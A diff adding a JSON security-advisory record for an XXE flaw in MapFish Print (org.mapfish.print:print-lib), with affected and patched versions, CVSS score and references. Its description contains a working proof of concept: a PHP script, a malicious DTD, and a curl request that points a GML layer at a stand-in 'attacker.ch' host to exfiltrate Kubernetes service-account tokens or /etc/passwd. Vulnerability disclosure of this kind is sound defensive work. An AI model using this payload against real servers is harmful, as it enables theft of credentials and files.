@@ -1,0 +1,116 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-08-28T22:33:36Z",
+  "Package": {
+    "Ecosystem": "MAVEN",
+    "Name": "org.mapfish.print:print-lib"
+  },
+  "Advisory": {
+    "DatabaseId": 418028,
+    "Id": "GSA_kwCzR0hTQS01djI5LTM0aDgtdjY4cs4ABmDs",
+    "GhsaId": "GHSA-5v29-34h8-v68r",
+    "References": [
+      {
+        "Url": "https://github.com/mapfish/mapfish-print/security/advisories/GHSA-5v29-34h8-v68r"
+      },
+      {
+        "Url": "https://github.com/mapfish/mapfish-print/pull/4221"
+      },
+      {
+        "Url": "https://github.com/mapfish/mapfish-print/pull/4219"
+      },
+      {
+        "Url": "https://github.com/mapfish/mapfish-print/pull/4217"
+      },
+      {
+        "Url": "https://github.com/mapfish/mapfish-print/pull/4216"
+      },
+      {
+        "Url": "https://github.com/mapfish/mapfish-print/pull/4215"
+      },
+      {
+        "Url": "https://github.com/mapfish/mapfish-print/pull/4212"
+      },
+      {
+        "Url": "https://github.com/mapfish/mapfish-print/commit/d13911ac6e0509444d64e74830f10b14e4dcfdf1"
+      },
+      {
+        "Url": "https://github.com/mapfish/mapfish-print/commit/a55a24873db5f19b37abac7d59144dc86406c236"
+      },
+      {
+        "Url": "https://github.com/mapfish/mapfish-print/commit/56c47d3bf70d8428916dea8ed7005518ad07dc7d"
+      },
+      {
+        "Url": "https://github.com/mapfish/mapfish-print/commit/3525e8150fcb5f40095930ccf7aec0d8ce92bbcb"
+      },
+      {
+        "Url": "https://github.com/mapfish/mapfish-print/commit/23a96e7baa15077bdb0e5fc5a72b18da23af9121"
+      },
+      {
+        "Url": "https://github.com/mapfish/mapfish-print/commit/13beae7a7f970fc3526c1f7ca5db817d8d51fbec"
+      },
+      {
+        "Url": "https://github.com/mapfish/mapfish-print/releases/tag/3.28.30"
+      },
+      {
+        "Url": "https://github.com/mapfish/mapfish-print/releases/tag/3.30.32"
+      },
+      {
+        "Url": "https://github.com/mapfish/mapfish-print/releases/tag/3.31.24"
+      },
+      {
+        "Url": "https://github.com/mapfish/mapfish-print/releases/tag/4.0.5"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-5v29-34h8-v68r"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-5v29-34h8-v68r"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-55848"
+      }
+    ],
+    "Description": "### Summary\nXXE on MapFish Print allows reading arbitrary files of certain types. Eg /etc/passwd or k8 secrets and certs.\n\nhttps://github.com/mapfish/mapfish-print/commit/13020c0fbc299e5f604e4e66066311c4bf04d507\n\n### Details\nTo trigger the XXE it is required to host a remote script and dtd file. When using the Print feature its possible to send the attacker server url as url of the gml layer.\n\nThe 404 not found path when using the gml Layer will expand the content of the file as path and throw a default 404 with the full content as path.\n\n### PoC\nHost this php file somewhere as xxe.php:\n\n```\n\u003c?php\n$p=$_GET['p'];\n$d=dirname($_SERVER['SCRIPT_NAME']);\n$u=(empty($_SERVER['HTTPS'])?'http':'https').\"://{$_SERVER['HTTP_HOST']}$d/evil.dtd\";\nheader('Content-Type: application/xml');\necho \"\u003c?xml version=\\\"1.0\\\"?\u003e\n\u003c!DOCTYPE x [\n \u003c!ENTITY % payload SYSTEM \\\"file://$p\\\"\u003e\n \u003c!ENTITY % dtd SYSTEM \\\"$u\\\"\u003e\n %dtd;\n]\u003e\n\u003cwfs:FeatureCollection xmlns:wfs=\\\"http://www.opengis.net/wfs\\\" xmlns:gml=\\\"http://www.opengis.net/gml\\\"\u003e\n\u003c!-- \".str_repeat('x',200).\" --\u003e\n\u003cgml:boundedBy\u003e\u003cgml:null\u003eunknown\u003c/gml:null\u003e\u003c/gml:boundedBy\u003e\n\u003c/wfs:FeatureCollection\u003e\";\n```\n\nand beneath host this \"evil.dtd\"\n\n`\u003c!ENTITY % exfil \"\u003c!ENTITY \u0026#37; error SYSTEM 'file:///xxe-exfil/%payload;'\u003e\"\u003e\n%exfil;\n%error;`\n\nNow send a single curl request against your mapfish print server and include your hosted poc url as gml layer url with the path attached you would like to exfil. It will exfil /var/run/secrets/kubernetes.io/serviceaccount/token (most likely your local test setup wont have it, then just replace the path with /etc/passwd or similar plain files)\n\n`curl -sk 'https://mapfish/api/print3/print/mapviewer/buildreport.pdf' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"layout\":\"1. A4 landscape\",\"attributes\":{\"printDate\":\"a\",\"url\":\"\",\"copyright\":\"\",\"qrimage\":\"\",\"map\":{\"projection\":\"EPSG:2056\",\"rotation\":0,\"dpi\":96,\"center\":[2600000,1200000],\"scale\":100000,\"layers\":[{\"type\":\"gml\",\"url\":\"https://attacker.ch/xxe.php?p=/var/run/secrets/kubernetes.io/serviceaccount/token\"}]}},\"outputFormat\":\"pdf\"}'`\n\nIts also noteworthy that when you use just a path with slash in the end /tmp/ for example - it will literally list the files and output this for you.\n\nIt is actually also possible to trigger an SSRF and request internal URLs if you'd change the file:// prefix in the dtd to https:// \n\n### Impact\ndisclose local files. blind(ish) SSRF (depends on the servers response data)",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-08-28T22:33:35Z",
+    "Severity": "HIGH",
+    "Summary": "MapFish Print has XXE that allows reading arbitrary files of certain types",
+    "UpdatedAt": "2026-08-28T22:33:36Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 8.6,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "4.0.5"
+      },
+      "VulnerableVersionRange": "\u003e= 3.34.0, \u003c 4.0.5"
+    },
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "3.33.16"
+      },
+      "VulnerableVersionRange": "\u003e= 3.32.0, \u003c 3.33.16"
+    },
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "3.30.32"
+      },
+      "VulnerableVersionRange": "\u003e= 3.29.0, \u003c 3.30.32"
+    },
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "3.28.30"
+      },
+      "VulnerableVersionRange": "\u003e= 3.0.0, \u003c 3.28.30"
+    }
+  ]
+}
